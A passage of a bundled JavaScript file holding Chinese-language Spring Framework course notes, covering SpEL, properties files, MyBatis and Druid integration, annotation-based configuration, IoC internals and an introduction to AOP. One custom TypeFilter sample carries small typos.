4.10)SpEL （了解）\n\n- Spring提供了对EL表达式的支持，统一属性注入格式\n\n- 类型：**属性值**\n\n- 归属：value属性值\n\n- 作用：为bean注入属性值\n\n- 格式：\n\n  ```xml\n  <property value="EL"></bean>\n  ```\n\n- 注意：所有属性值不区分是否引用类型，统一使用value赋值\n\n- 所有格式统一使用  value=“********”\n\n  - 常量  #{10}  #{3.14}  #{2e5}  #{‘itcast’}\n\n  - 引用bean  #{beanId}    \n\n  - 引用bean属性  #{beanId.propertyName}\n\n  - 引用bean方法  beanId.methodName().method2()\n\n  - 引用静态方法  T(java.lang.Math).PI\n\n  - 运算符支持  #{3 lt 4 == 4 ge 3}\n\n  - 正则表达式支持  #{user.name matches‘[a-z]{6,}’}\n\n  - 集合支持  #{likes[3]}\n\n- 案例：\n\n  ```xml\n   <bean id="userService" class="com.itheima.service.impl.UserServiceImpl">\n       <property name="userDao" value="#{userDao}"/>\n       <property name="bookDao" value="#{bookDao}"/>\n       <property name="num" value="#{666666666}"/>\n       <property name="version" value="#{\'itcast\'}"/>\n  </bean>\n  ```\n\n### 4.11)properties文件\n\n- Spring提供了读取外部properties文件的机制，使用读取到的数据为bean的属性赋值\n\n- 操作步骤\n\n  1.准备外部properties文件\n\n  2.开启context命名空间支持\n\n  ```xml\n  xmlns:context="http://www.springframework.org/schema/context"\n  ```\n\n​\t\t3.加载指定的properties文件\n\n```xml\n<context:property-placeholder location="classpath:filename.properties">\n```\n\n​\t\t4.使用加载的数据\n\n```xml\n<property name="propertyName" value="${propertiesName}"/>\n```\n\n- 注意：如果需要加载所有的properties文件，可以使用`*.properties`表示加载所有的properties文件\n\n- 注意：读取数据使用**${propertiesName}**格式进行，其中**propertiesName**指properties文件中的属性名\n\n### 4.12)团队开发\n\n- 名称：import\n\n- 类型：**标签**\n\n- 归属：beans标签\n\n- 作用：在当前配置文件中导入其他配置文件中的项\n\n- 格式：\n\n  ```xml\n  <beans>\n      <import />\n  </beans>\n  ```\n\n- 基本属性：\n\n  ```xml\n  <import resource=“config.xml"/>\n  ```\n\n​\tresource：加载的配置文件名\n\n- Spring容器加载多个配置文件\n\n  ```java\n  new ClassPathXmlApplicationContext("config1.xml","config2.xml");\n  ```\n\n- Spring容器中的bean定义冲突问题\n\n  - 同id的bean，后定义的覆盖先定义的\n\n  - 导入配置文件可以理解为将导入的配置文件复制粘贴到对应位置\n\n  - 导入配置文件的顺序与位置不同可能会导致最终程序运行结果不同\n\n### 4.13)ApplicationContext\n\n1.ApplicationContext是一个接口，提供了访问spring容器的API\n\n2.ClassPathXmlApplicationContext是一个类，实现了上述功能\n\n3.ApplicationContext的顶层接口是BeanFactory\n\n4.BeanFactory定义了bean相关的最基本操作\n\n5.ApplicationContext在BeanFactory基础上追加了若干新功能\n\n**对比BeanFactory**\n\n1.BeanFactory创建的bean采用延迟加载形式，使用才创建\n\n2.ApplicationContext创建的bean默认采用立即加载形式\n\n**FileSystemXmlApplicationContext**\n\n可以加载文件系统中任意位置的配置文件，而ClassPathXmlApplicationContext只能加载类路径下的配置文件\n\n![1591021082290](./img/java/springmvc/Spring-day01/1591021082290.png)\n\n**BeanFactory**\n\n```java\nResource res = new ClassPathResource("applicationContext.xml");\nBeanFactory bf = new XmlBeanFactory(res);\nUserService userService = (UserService)bf.getBean("userService");\n```\n\n### 4.14)第三方资源配置\n\n- 阿里数据源方案Druid\n\n  ```xml\n  <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n      <property name="driverClassName" value="com.mysql.jdbc.Driver"></property>\n      <property name="url" value="jdbc:mysql://localhost:3306/spring_ioc"></property>\n      <property name="username" value="root"></property>\n      <property name="password" value="root"></property>\n  </bean>\n  \n  ```\n\n## 5)综合案例\n\n### **5.1)案例介绍**\n\n- 使用spring整合mybatis技术，完成账户模块（Account）的基础增删改查功能\n\n- 账户模块对应字段\n\n  - 编号：id\n\n  - 账户名：name\n\n  - 余额：money\n\n### **5.2)案例分析**\n\n非spring环境\n\n1.实体类与表\n\n2.业务层接口与实现\n\n3.数据层接口\n\n4.Mybatis核心配置\n\n5.Mybatis映射配置\n\n6.客户端程序测试功能\n\n\n\nspring环境\n\n1.实体类与表\n\n2.业务层接口与实现（提供数据层接口的注入操作）\n\n3.数据层接口\n\n4.Mybatis核心配置（交给spring控制，该文件省略）\n\n5.Mybatis映射配置\n\n6.客户端程序测试功能（使用spring方式获取bean）\n\n7.Spring核心配置文件\n\n8.Druid数据源的应用（可选）\n\n9.Spring整合MyBatis\n\n\n\n### 5.3)案例制作步骤——基础准备工作\n\n- 环境准备\n\n1.导入Spring坐标，MyBatis坐标，MySQL坐标，Druid坐标\n\n- 业务类与接口准备\n\n2.创建数据库表，并制作相应的实体类Account\n\n3.定义业务层接口与数据层接口\n\n4.在业务层调用数据层接口，并实现业务方法的调用\n\n- 基础配置文件\n\n5.jdbc.properties\n\n6.MyBatis映射配置文件\n\n### 5.4)案例制作步骤——整合准备工作\n\n- 整合前基础准备工作\n\n1.spring配置文件，加上context命名空间，用于加载properties文件\n\n2.开启加载properties文件\n\n3.配置数据源druid（备用）\n\n4.定义service层bean，注入dao层bean\n\n5.dao的bean无需定义，使用代理自动生成\n\n### 5.5)案例制作步骤——整合工作\n\n- 整合工作\n\n1.导入Spring整合MyBatis坐标\n\n2.将mybatis配置成spring管理的bean（SqlSessionFactoryBean）\n\n​\t-将原始配置文件中的所有项，转入到当前配置中\n\n​\t数据源转换\n\n​\t映射转换\n\n3.通过spring加载mybatis的映射配置文件到spring环境中\n\n4.设置类型别名\n\n- 测试结果\n\n5.使用spring环境加载业务层bean，执行操作\n\n```xml\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans\n        https://www.springframework.org/schema/beans/spring-beans.xsd\n        http://www.springframework.org/schema/context\n        https://www.springframework.org/schema/context/spring-context.xsd">\n\n    \x3c!--加载perperties配置文件的信息--\x3e\n    <context:property-placeholder location="classpath:*.properties"/>\n\n    \x3c!--加载druid资源--\x3e\n    <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n        <property name="driverClassName" value="${jdbc.driver}"/>\n        <property name="url" value="${jdbc.url}"/>\n        <property name="username" value="${jdbc.username}"/>\n        <property name="password" value="${jdbc.password}"/>\n    </bean>\n\n    \x3c!--配置service作为spring的bean,注入dao--\x3e\n    <bean id="accountService" class="com.itheima.service.impl.AccountServiceImpl">\n        <property name="accountDao" ref="accountDao"/>\n    </bean>\n\n    \x3c!--spring整合mybatis后控制的创建连接用的对象--\x3e\n    <bean class="org.mybatis.spring.SqlSessionFactoryBean">\n        <property name="dataSource" ref="dataSource"/>\n        <property name="typeAliasesPackage" value="com.itheima.domain"/>\n    </bean>\n\n    \x3c!--加载mybatis映射配置的扫描，将其作为spring的bean进行管理--\x3e\n    <bean class="org.mybatis.spring.mapper.MapperScannerConfigurer">\n        <property name="basePackage" value="com.itheima.dao"/>\n    </bean>\n\n\n\n</beans>\n\n\n\n```\n\n\n### **小节**\n\n- 需要专用的spring整合mybatis的jar包\n\n- Mybatis核心配置文件消失\n\n  - 环境environment转换成数据源对象\n\n  - 映射Mapper扫描工作交由spring处理\n\n  - 类型别名交由spring处理\n\n- 业务发起使用spring上下文对象获取对应的bean\n\n',xe={data:function(){return{MainComponent:_e}}},we=xe,Ee=Object(u["a"])(we,ye,fe,!1,null,"5b05fd68",null),Te=Ee.exports,ke=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ce=[],je='# 注解开发\n\n## 1)注解驱动的意义\n\n### 1.1)什么是注解驱动\n\n注解启动时使用注解的形式替代xml配置，将繁杂的spring配置文件从工程中彻底消除掉，简化书写\n\n![1591023265469](./img/java/springmvc/Spring-day02/1591023265469.png)\n\n### 1.2)注解驱动的弊端\n\n- 为了达成注解驱动的目的，可能会将原先很简单的书写，变的更加复杂\n\n- XML中配置第三方开发的资源是很方便的，但使用注解驱动无法在第三方开发的资源中进行编辑，因此会增大开发工作量\n\n![1591023337010](./img/java/springmvc/Spring-day02/1591023337010.png)\n\n\n\n## 2)常用注解\n\n### 2.1)启动注解功能\n\n- 启动注解扫描，加载类中配置的注解项\n\n  ```xml\n  <context:component-scan base-package="packageName"/>\n  ```\n\n- 说明：\n\n  - 在进行包所扫描时，会对配置的包及其子包中所有文件进行扫描\n\n  - 扫描过程是以文件夹递归迭代的形式进行的\n\n  - 扫描过程仅读取合法的java文件\n\n  - 扫描时仅读取spring可识别的注解\n\n  - 扫描结束后会将可识别的有效注解转化为spring对应的资源加入IoC容器\n\n- 注意：\n\n  - 无论是注解格式还是XML配置格式，最终都是将资源加载到IoC容器中，差别仅仅是数据读取方式不同\n\n  - 从加载效率上来说注解优于XML配置文件\n\n### 2.2)bean的定义\n\n- 名称：@Component    @Controller    @Service    @Repository\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：设置该类为spring管理的bean\n\n- 范例：\n\n  ```java\n  @Component\n  public class ClassName{}\n  ```\n\n- 说明：\n\n  - @Controller、@Service 、@Repository是@Component的衍生注解，功能同@Component\n\n- 相关属性\n  - value（默认）：定义bean的访问id\n\n### 2.3)bean的作用域\n\n- 名称：@Scope\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：设置该类作为bean对应的scope属性\n\n- 范例：\n\n  ```java\n  @Scope\n  public class ClassName{}\n  ```\n\n- 相关属性\n\n  - value（默认）：定义bean的作用域，默认为singleton\n\n### 2.4)bean的生命周期\n\n- 名称：@PostConstruct、@PreDestroy\n\n- 类型：**方法注解**\n\n- 位置：方法定义上方\n\n- 作用：设置该类作为bean对应的生命周期方法\n\n- 范例：\n\n  ```java\n  @PostConstruct\n  public void init() { System.out.println("init..."); }\n  ```\n\n### 2.5)加载第三方资源\n\n- 名称：@Bean\n\n- 类型：**方法注解**\n\n- 位置：方法定义上方\n\n- 作用：设置该方法的返回值作为spring管理的bean\n\n- 范例：\n\n  ```java\n  @Bean("dataSource")\n  public DruidDataSource createDataSource() {    return ……;    }\n  ```\n\n- 说明：\n\n  - 因为第三方bean无法在其源码上进行修改，使用@Bean解决第三方bean的引入问题\n\n  - 该注解用于替代XML配置中的静态工厂与实例工厂创建bean，不区分方法是否为静态或非静态\n\n  - @Bean所在的类必须被spring扫描加载，否则该注解无法生效\n\n- 相关属性\n  - value（默认）：定义bean的访问id\n\n### 2.6)bean的非引用类型属性注入\n\n- 名称：@Value\n\n- 类型：**属性注解、方法注解**\n\n- 位置：属性定义上方，方法定义上方\n\n- 作用：设置对应属性的值或对方法进行传参\n\n- 范例：\n\n  ```java\n  @Value("${jdbc.username}")\n  private String username;\n  ```\n\n- 说明：\n\n  - value值仅支持非引用类型数据，赋值时对方法的所有参数全部赋值\n\n  - value值支持读取properties文件中的属性值，通过类属性将properties中数据传入类中\n\n  - value值支持SpEL\n\n  - @value注解如果添加在属性上方，可以省略set方法（set方法的目的是为属性赋值）\n\n- 相关属性\n  - value（默认）：定义对应的属性值或参数值\n\n### 2.7)bean的引用类型属性注入\n\n- 名称：@Autowired、@Qualifier\n\n- 类型：**属性注解、方法注解**\n\n- 位置：属性定义上方，方法定义上方\n\n- 作用：设置对应属性的对象或对方法进行引用类型传参\n\n- 范例：\n\n  ```java\n  @Autowired(required = false)\n  @Qualifier("userDao")\n  private UserDao userDao;\n  ```\n\n- 说明：\n\n  - @Autowired默认按类型装配，指定@Qualifier后可以指定自动装配的bean的id\n\n- 相关属性\n  - required：定义该属性是否允许为null\n\n### 2.8)bean的引用类型属性注入\n\n- 名称：@Primary\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：设置类对应的bean按类型装配时优先装配\n\n- 范例：\n\n  ```java\n  @Primary\n  public class ClassName{}\n  ```\n\n- 说明：\n\n  - @Autowired默认按类型装配，当出现相同类型的bean，使用@Primary提高按类型自动装配的优先级，多个@Primary会导致优先级设置无效\n\n### 2.9)bean的引用类型属性注入\n\n- 名称：@Inject、@Named、@Resource\n\n- 说明：\n  - @Inject与@Named是JSR330规范中的注解，功能与@Autowired和@Qualifier完全相同，适用于不同架构场景\n  - @Resource是JSR250规范中的注解，可以简化书写格式\n\n- @Resource相关属性\n\n  - name：设置注入的bean的id\n\n  - type：设置注入的bean的类型，接收的参数为Class类型\n\n### 2.10)加载properties文件\n\n- 名称：@PropertySource\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：加载properties文件中的属性值\n\n- 范例：\n\n  ```java\n  @PropertySource(value = "classpath:filename.properties")\n  public class ClassName {\n      @Value("${propertiesAttributeName}")\n      private String attributeName;\n  }\n  ```\n\n- 说明：\n\n  - 不支持*通配格式，一旦加载，所有spring控制的bean中均可使用对应属性值\n\n- 相关属性\n\n  - value（默认）：设置加载的properties文件名\n\n  - ignoreResourceNotFound：如果资源未找到，是否忽略，默认为false\n\n### 2.11)纯注解格式\n\n- 名称：@Configuration、@ComponentScan\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：设置当前类为spring核心配置加载类\n\n- 范例：\n\n  ```java\n  @Configuration\n  @ComponentScan("scanPackageName")\n  public class SpringConfigClassName{\n  }\n  ```\n\n- 说明：\n\n  - 核心配合类用于替换spring核心配置文件，此类可以设置空的，不设置变量与属性\n\n  - bean扫描工作使用注解@ComponentScan替代\n\n**AnnotationConfigApplicationContext**\n\n- 加载纯注解格式上下文对象，需要使用AnnotationConfigApplicationContext\n\n  ```java\n  AnnotationConfigApplicationContext ctx = new AnnotationConfigApplicationContext(SpringConfig.class);\n  ```\n\n### 2.12)第三方bean配置与管理\n\n- 名称：@Import\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：导入第三方bean作为spring控制的资源\n\n- 范例：\n\n  ```java\n  @Configuration\n  @Import(OtherClassName.class)\n  public class ClassName {\n  }\n  ```\n\n- 说明：\n\n  - @Import注解在同一个类上，仅允许添加一次，如果需要导入多个，使用数组的形式进行设定\n\n  - 在被导入的类中可以继续使用@Import导入其他资源（了解）\n\n  - @Bean所在的类可以使用导入的形式进入spring容器，无需声明为bean\n\n## 3)bean加载控制\n\n### 3.1)依赖加载\n\n(1)@DependsOn\n\n- 名称：@DependsOn\n\n- 类型：类注解、方法注解\n\n- 位置：bean定义的位置（类上或方法上）\n\n- 作用：控制bean的加载顺序，使其在指定bean加载完毕后再加载\n\n- 范例：\n\n  ```java\n  @DependsOn("beanId")\n  public class ClassName {\n  }\n  ```\n\n- 说明：\n\n  - 配置在方法上，使@DependsOn指定的bean优先于@Bean配置的bean进行加载\n\n  - 配置在类上，使@DependsOn指定的bean优先于当前类中所有@Bean配置的bean进行加载\n\n  - 配置在类上，使@DependsOn指定的bean优先于@Component等配置的bean进行加载\n\n- 相关属性\n  - value（默认）：设置当前bean所依赖的bean的id\n\n(2)@Order\n\n- 名称：@Order\n\n- 类型：**配置类注解**\n\n- 位置：配置类定义的位置（类上）\n\n- 作用：控制配置类的加载顺序\n\n- 范例：\n\n  ```java\n  @Order(1)\n  public class SpringConfigClassName {\n  }\n  ```\n\n(3)@Lazy\n\n- 名称：@Lazy\n\n- 类型：**类注解、方法注解**\n\n- 位置：bean定义的位置（类上或方法上）\n\n- 作用：控制bean的加载时机，使其延迟加载\n\n- 范例：\n\n  ```java\n  @Lazy\n  public class ClassName {\n  }\n  ```\n\n### **3.2)依赖加载应用场景**\n\n@DependsOn\n\n- 微信订阅号，发布消息和订阅消息的bean的加载顺序控制\n\n- 双11活动期间，零点前是结算策略A，零点后是结算策略B，策略B操作的数据为促销数据。策略B加载顺序与促销数据的加载顺序\n\n@Lazy\n\n- 程序灾难出现后对应的应急预案处理是启动容器时加载时机\n\n@Order\n\n- 多个种类的配置出现后，优先加载系统级的，然后加载业务级的，避免细粒度的加载控制\n\n\n\n## 4)整合第三方技术\n\n### 4.1)综合案例改版（注解整合MyBatis）\n\n![1591024717408](./img/java/springmvc/Spring-day02/1591024717408.png)\n\n### 4.2)注解整合MyBatis分析\n\n- 业务类使用注解形式声明bean，属性采用注解注入\n\n- 建立独立的配置管理类，分类管理外部资源，根据功能进行分类，并提供对应的方法获取bean\n\n- 使用注解形式启动bean扫描，加载所有注解配置的资源（bean）\n\n- 使用AnnotationConfigApplicationContext对象加载所有的启动配置类，内部使用导入方式进行关联\n\n### 4.3)注解整合MyBatis步骤\n\n1.修改mybatis外部配置文件格式为注解格式\n\n2.业务类使用@Component声明bean，使用@Autowired注入对象\n\n3.建立配置文件JDBCConfig与MyBatisConfig类，并将其导入到核心配置类SpringConfig\n\n4.开启注解扫描\n\n5.使用AnnotationConfigApplicationContext对象加载配置项\n\n### 4.4)综合案例改版（注解整合Junit）\n\n1.Spring接管Junit的运行权，使用Spring专用的Junit类加载器\n\n2.为Junit测试用例设定对应的spring容器：\n\n- 从Spring5.0以后，要求Junit的版本必须是4.12及以上\n\n- Junit仅用于单元测试，不能将Junit的测试类配置成spring的bean，否则该配置将会被打包进入工程中 \n\n\n\n导入Spring整合Junit坐标\n\n```xml\n<dependency>\n    <groupId>junit</groupId>\n    <artifactId>junit</artifactId>\n    <version>4.12</version>\n</dependency>\n<dependency>\n    <groupId>org.springframework</groupId>\n    <artifactId>spring-test</artifactId>\n    <version>5.1.9.RELEASE</version>\n</dependency>\n```\n\nSpring整合Junit测试用例注解格式\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(classes = SpringConfig.class)\npublic class UserServiceTest {\n}\n```\n\n## 5)IoC底层核心原理\n\n### 5.1)IoC核心接口\n\n![1591024936518](./img/java/springmvc/Spring-day02/1591024936518.png)\n\n### **5.2)组件扫描器**\n\n- 开发过程中，需要根据需求加载必要的bean，排除指定bean\n\n![1591024975438](./img/java/springmvc/Spring-day02/1591024975438.png)\n\n### **5.3)设定组件扫描加载过滤器**\n\n- 名称：@ComponentScan\n\n- 类型：**类注解**\n\n- 位置：类定义上方\n\n- 作用：设置spring配置加载类扫描规则\n\n- 范例：\n\n  ```java\n  @ComponentScan(\n      value="com.itheima",\t           //设置基础扫描路径\n      excludeFilters =                          //设置过滤规则，当前为排除过滤\n  \t@ComponentScan.Filter(            //设置过滤器\n  \t    type= FilterType.ANNOTATION,  //设置过滤方式为按照注解进行过滤\n  \t    classes=Repository.class)     //设置具体的过滤项，过滤所有@Repository修饰的bean\n      )\n  ```\n\n​\tincludeFilters：设置包含性过滤器\n\n​\texcludeFilters：设置排除性过滤器\n\n​\ttype：设置过滤器类型\n\n### **5.4)自定义组件过滤器**\n\n- 名称：TypeFilter\n\n- 类型：**接口**\n\n- 作用：自定义类型过滤器\n\n- 范例：\n\n  ```java\n  public class MyTypeFilter implements TypeFilter {\n      public boolean match(MetadataReader mr, MetadataReaderFactory mrf) throws IOException {\n          ClassMetadata cm = metadataReader.getClassMetadata();\n          tring className = cm.getClassName();\n          if(className.equals("com.itheima.dao.impl.BookDaoImpl")){\n              return false;\n          }\n          return false;\n      }\n  }\n  ```\n\n### **5.5)自定义导入器**\n\n- bean只有通过配置才可以进入spring容器，被spring加载并控制\n\n- 配置bean的方式如下：\n\n  - XML文件中使用<bean/>标签配置\n\n  - 使用@Component及衍生注解配置\n\n- 企业开发过程中，通常需要配置大量的bean，需要一种快速高效配置大量bean的方式\n\n**ImportSelector**\n\n- 名称： ImportSelector\n\n- 类型：**接口**\n\n- 作用：自定义bean导入器\n\n- 范例：\n\n  ```java\n  public class MyImportSelector implements ImportSelector {\n      public String[] selectImports(AnnotationMetadata icm) {\n          return new String[]{"com.itheima.dao.impl.AccountDaoImpl"};\n      }\n  }\n  ```\n\n  ```java\n  @Configuration\n  @ComponentScan("com.itheima")\n  @Import(MyImportSelector.class)\n  public class SpringConfig {\n  }\n  ```\n\n### **5.6)自定义注册器**\n\n- 名称：ImportBeanDefinitionRegistrar\n\n- 类型：**接口**\n\n- 作用：自定义bean定义注册器\n\n- 范例：\n\n  ```java\n  public class MyImportBeanDefinitionRegistrar implements ImportBeanDefinitionRegistrar {\n      public void registerBeanDefinitions(AnnotationMetadata icm, BeanDefinitionRegistry r) {\n          ClassPathBeanDefinitionScanner scanner = new ClassPathBeanDefinitionScanner(r, false);\n          TypeFilter tf = new TypeFilter() {\n              public boolean match(MetadataReader mr, MetadataReaderFactory mrf) throws IOException {\n                  return true;\n              }\n          };\n          scanner.addIncludeFilter(tf);\n          //scanner.addExcludeFilter(tf);\n          scanner.scan("com.itheima");\n      }\n  }\n  ```\n\n### 5.7)bean初始化过程解析\n\n![1591025338778](./img/java/springmvc/Spring-day02/1591025338778.png)\n\n### 5.8)bean初始化过程解析\n\n- BeanFactoryPostProcessor\n\n  - 作用：定义了在bean工厂对象创建后，bean对象创建前执行的动作，用于对工厂进行创建后业务处理\n\n  - 运行时机：当前操作用于对工厂进行处理，仅运行一次\n\n- BeanPostProcessor\n\n  - 作用：定义了所有bean初始化前后进行的统一动作，用于对bean进行创建前业务处理与创建后业务处理\n\n  - 运行时机：当前操作伴随着每个bean的创建过程，每次创建bean均运行该操作\n\n- InitializingBean\n\n  - 作用：定义了每个bean的初始化前进行的动作，属于非统一性动作，用于对bean进行创建前业务处理\n\n  - 运行时机：当前操作伴随着任意一个bean的创建过程，保障其个性化业务处理\n\n- 注意：上述操作均需要被spring容器加载放可运行\n\n### 5.9)bean初始化过程解析\n\n![1591025440019](./img/java/springmvc/Spring-day02/1591025440019.png)\n\n### 5.10)繁琐的bean初始化过程处理\n\n- FactoryBean\n  - 对单一的bean的初始化过程进行封装，达到简化配置的目的\n\n**FactoryBean与BeanFactory区别**\n\n- FactoryBean：封装单个bean的创建过程\n\n- BeanFactory：Spring容器顶层接口，定义了bean相关的获取操作\n\n',Me={data:function(){return{MainComponent:je}}},Re=Me,Le=Object(u["a"])(Re,ke,Ce,!1,null,"2f711389",null),Oe=Le.exports,Ae=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},Ie=[],De='# AOP\n\n## 1)AOP简介\n\n### 1.1)OOP开发思路\n\n![1591281580135](./img/java/springmvc/Spring-day03/1591281580135.png)\n\n### 1.2)AOP开发思想\n\n![1591281706237](./img/java/springmvc/Spring-day03/1591281706237.png)\n\n### 1.3)AOP概念\n\n- AOP(Aspect Oriented Programing)面向切面编程，一种编程**范式**，隶属于软工范畴，指导开发者如何组织程序结构\n\n- AOP弥补了OOP的不足，基于OOP基础之上进行横向开发\n\n  - uOOP规定程序开发以类为主体模型，一切围绕对象进行，完成某个任务先构建模型\n\n  - uAOP程序开发主要关注基于OOP开发中的共性功能，一切围绕共性功能进行，完成某个任务先构建可能遇到的所有共性功能（当所有功能都开发出来也就没有共性与非共性之分）\n\n- “AOP联盟”\n\n### 1.4)AOP作用\n\n- 伴随着AOP时代的降临，可以从各个行业的标准化、规范化开始入手，一步一步将所有共性功能逐一开发完毕，最终以功能组合来完成个别业务模块乃至整体业务系统的开发\n\n- 目标：将软件开发由手工制作走向半自动化/全自动化阶段，实现“插拔式组件体系结构”搭建\n\n### 1.5)AOP优势\n\n- 提高代码的可重用性\n\n- 业务代码编码更简洁\n\n- 业务代码维护更高效\n\n- 业务功能扩展更便捷\n\n![1591281844901](./img/java/springmvc/Spring-day03/1591281844901.png)\n\n\n\n## 2)AOP入门案例\n\n### 2.1)AOP相关概念\n\n![1591281889446](./img/java/springmvc/Spring-day03/1591281889446.png)\n\n![1591281914574](./img/java/springmvc/Spring-day03/1591281914574.png)\n\n![1591281945260](./img/java/springmvc/Spring-day03/1591281945260.png)\n\n- Joinpoint(连接点)：就是方法\n\n- Pointcut(切入点)：就是挖掉共性功能的方法\n\n- Advice(通知)：就是共性功能，最终以一个方法的形式呈现\n\n- Aspect(切面)：就是共性功能与挖的位置的对应关系\n\n- Target(目标对象)：就是挖掉功能的方法对应的类产生的对象，这种对象是无法直接完成最终工作的\n\n- Weaving(织入)：就是将挖掉的功能回填的动态过程\n\n- Proxy(代理)：目标对象无法直接完成工作，需要对其进行功能回填，通过创建原始对象的代理对象实现\n\n- Introduction(引入/引介) ：就是对原始对象无中生有的添加成员变量或成员方法\n\n### 2.2)AOP开发过程\n\n- 开发阶段(开发者完成)\n\n  - 正常的制作程序\n\n  - 将非共性功能开发到对应的目标对象类中，并制作成切入点方法\n\n  - 将共性功能独立开发出来，制作成**通知**\n\n  - 在配置文件中，声明**切入点**\n\n  - 在配置文件中，声明**切入点**与**通知**间的关系（含**通知类型**），即**切面**\n\n- 运行阶段(AOP完成)\n\n  - Spring容器加载配置文件，监控所有配置的**切入点**方法的执行\n\n  - 当监控到**切入点**方法被运行，使用**代理**机制，动态创建**目标对象**的**代理对象**，根据**通知类别**，在**代理对象**的对应位置将**通知**对应的功能**织入**，完成完整的代码逻辑并运行\n\n### 2.2)AOP开发方式\n\n- XML方式\n\n- XML+注解方式\n\n- 注解方式\n\n### 2.3)入门案例制作分析\n\n1.导入相关坐标\n\n2.确认要抽取的功能，并将其制作成方法保存到专用的类中，删除原始业务中对应的功能\n\n3.将所有进行AOP操作的资源加载到IoC容器中\n\n4.使用配置的方式描述被抽取功能的位置，并描述被抽取功能与对应位置的关系\n\n5.运行程序\n\n\n\n步骤一 导入坐标\n\n```xml\n<dependency>\n    <groupId>org.aspectj</groupId>\n    <artifactId>aspectjweaver</artifactId>\n    <version>1.9.4</version>\n</dependency>\n```\n\n步骤二 在业务层抽取通用代码\n\n![1591282302976](./img/java/springmvc/Spring-day03/1591282302976.png)\n\n步骤三 把通知加入spring容器管理\n\n![1591282320624](./img/java/springmvc/Spring-day03/1591282320624.png)\n\n\n\n步骤四 在配置文件中配置aop的配置 \n\n```xml\n\x3c!--aop配置--\x3e\n<aop:config>\n    \x3c!--配置切入点--\x3e\n    <aop:pointcut id="pt" expression="execution(* *..*())"/>\n    \x3c!--配置切面--\x3e\n    <aop:aspect ref="myAdvice">\n        <!—通知与切入点之间的关系--\x3e\n        <aop:before method="logAdvice" pointcut-ref="pt"/>\n    </aop:aspect>\n</aop:config>\n```\n\n## 3)AOP配置（XML）\n\n### 3.1)**AspectJ**\n\n- Aspect（切面）用于描述切入点与通知间的关系，是AOP编程中的一个概念\n\n- AspectJ是基于java语言对Aspect的实现\n\n### 3.2)AOP配置\n\n#### 3.2.1)aop:config\n\n- 名称：aop:config\n\n- 类型：**标签**\n\n- 归属：beans标签\n\n- 作用：设置AOP\n\n- 格式：\n\n  ```xml\n  <beans>\n      <aop:config>……</aop:config>\n      <aop:config>……</aop:config>\n  </beans>\n  ```\n\n- 说明：一个beans标签中可以配置多个aop:config标签\n\n#### 3.2.2)aop:aspect\n\n- 名称：aop:aspect\n\n- 类型：**标签**\n\n- 归属：aop:config标签\n\n- 作用：设置具体的AOP通知对应的切入点\n\n- 格式：\n\n  ```xml\n  <aop:config>\n      <aop:aspect ref="beanId">……</aop:aspect>\n      <aop:aspect ref="beanId">……</aop:aspect>\n  </aop:config>\n  ```\n\n- 说明：\n\n  一个aop:config标签中可以配置多个aop:aspect标签\n\n- 基本属性：\n\n  - ref ：通知所在的bean的id\n\n#### 3.2.3)aop:pointcut\n\n- 名称：aop:pointcut\n\n- 类型：**标签**\n\n- 归属：aop:config标签、aop:aspect标签\n\n- 作用：设置切入点\n\n- 格式：\n\n  ```xml\n  <aop:config>\n      <aop:pointcut id="pointcutId" expression="……"/>\n      <aop:aspect>\n          <aop:pointcut id="pointcutId" expression="……"/>\n      </aop:aspect>\n  </aop:config>\n  ```\n\n- 说明：\n\n  一个aop:config标签中可以配置多个aop:pointcut标签，且该标签可以配置在aop:aspect标签内\n\n- 基本属性：\n\n  - id ：识别切入点的名称\n\n  - expression ：切入点表达式\n\n### **3.3)切入点**\n\n- 切入点描述的是某个方法\n\n- 切入点表达式是一个快速匹配方法描述的通配格式，类似于正则表达式\n\n### **3.4)切入点表达式的组成**\n\n- 切入点描述的是某个方法\n\n- 切入点表达式是一个快速匹配方法描述的通配格式，类似于正则表达式\n\n  ```xml\n  关键字（访问修饰符  返回值  包名.类名.方法名（参数）异常名）\n  ```\n\n​\t关键字：描述表达式的匹配模式（参看关键字列表）\n\n​\t访问修饰符：方法的访问控制权限修饰符\n\n​\t类名：方法所在的类（此处可以配置接口名称）\n\n​\t异常：方法定义中指定抛出的异常\n\n- 范例：\n\n  ```xml\n  execution（public User com.itheima.service.UserService.findById（int））\n  ```\n\n#### 3.4.1)切入点表达式——关键字\n\n- execution ：匹配执行指定方法\n\n- args ：匹配带有指定参数类型的方法\n\n- within ：…… \n\n- this ：…… \n\n- target ：…… \n\n- @within ：…… \n\n- @target ：…… \n\n- @args ：…… \n\n- @annotation ：…… \n\n- bean ：……\n\n- reference pointcut ：……\n\n#### 3.4.2)切入点表达式——**通配符**\n\n- *：单个独立的任意符号，可以独立出现，也可以作为前缀或者后缀的匹配符出现\n\n  ```xml\n  execution（public * com.itheima.*.UserService.find*（*））\n  ```\n\n​\t匹配com.itheima包下的任意包中的UserService类或接口中所有find开头的带有一个参数的方法\n\n- .. ：多个连续的任意符号，可以独立出现，常用于简化包名与参数的书写\n\n  ```xml\n  execution（public User com..UserService.findById（..））\n  ```\n\n​\t匹配com包下的任意包中的UserService类或接口中所有名称为findById的方法\n\n- +：专用于匹配子类类型\n\n  ```xml\n  execution(* *..*Service+.*(..))\n  ```\n\n#### 3.4.3)切入点表达式——逻辑运算符\n\n- && ：连接两个切入点表达式，表示两个切入点表达式同时成立的匹配\n\n- || ：连接两个切入点表达式，表示两个切入点表达式成立任意一个的匹配\n\n- ! 